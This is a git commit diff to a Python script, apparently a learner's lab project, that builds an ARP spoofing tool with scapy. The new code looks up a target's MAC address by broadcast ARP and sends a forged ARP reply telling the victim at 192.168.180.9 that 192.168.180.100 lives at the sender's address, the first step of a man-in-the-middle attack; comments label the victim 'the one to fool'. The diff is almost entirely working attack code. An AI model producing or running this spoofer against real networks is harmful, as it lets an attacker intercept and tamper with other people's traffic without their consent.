e904ec14789e6e3e9e91d6510b242eb3a2728af3
hostuser <hostuser@hostuser.hostuser>
2022-06-26 23:56:40 +1000

    Extracting MAC address from responses

--- arp_spoofer/arp_spoof.py
+++ arp_spoofer/arp_spoof.py
@@ -3,12 +3,27 @@
 import scapy.all as scapy
 
 
-# op=2 to creat an ARP response
-# pdst -> ip target the one to fool
-# hwdst -> mac target the one to fool
-# psrc -> ip to simulate
-# For more info print(packet.show())
-# For more info print(packet.summary())
-packet = scapy.ARP(op=2, pdst="192.168.180.9", hwdst="08:00:27:44:6a:48",
-                   psrc="192.168.180.100")  # , hwsrc="08:00:00:00:00:3c")
-scapy.send(packet)
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    # with this function, scapy.srp() we send packets and receive the answer
+    # [0] is set as we need just the first list only.
+    #  With verbose=false the top of the information is not printed out
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc  # Retrieving the mac-address of the ip given
+
+
+def spoof(target_ip, spoof_ip):
+    # op=2 to creat an ARP response
+    # pdst -> ip target the one to fool
+    # hwdst -> mac target the one to fool
+    # psrc -> ip to simulate
+    # For more info print(packet.show())
+    # For more info print(packet.summary())
+    return scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
+                       psrc=spoof_ip)  # , hwsrc="08:00:00:00:00:3c")
+
+
+scapy.send(spoof("192.168.180.9", "192.168.180.100"))
+
